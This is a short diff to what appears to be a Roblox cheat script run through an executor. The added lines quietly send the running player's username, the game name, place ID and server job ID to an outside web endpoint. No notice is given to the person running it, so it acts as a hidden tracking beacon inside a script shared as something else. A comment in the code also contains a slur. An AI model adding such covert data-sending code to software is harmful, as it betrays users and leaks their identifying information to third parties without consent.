@@ -155,6 +155,10 @@ startup:Play()
 
 printconsole("gv has been executed!")
 
+local data = game:GetService("HttpService"):JSONEncode({ ["content"] = ""..game.Players.LocalPlayer.Name.. " joined "..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.." ("..game.PlaceId..") with jobid "..game.JobId.."" })
+local stuff = {Url = "https://websec.services/send/62bbc0ec3d31aa6a1cad2d65", Body = data, Method = "POST", Headers = { ["content-type"] = "application/json"}}
+syn.request(stuff)
+
 -- v2 cuz this shit retarded fr
 
 --[[
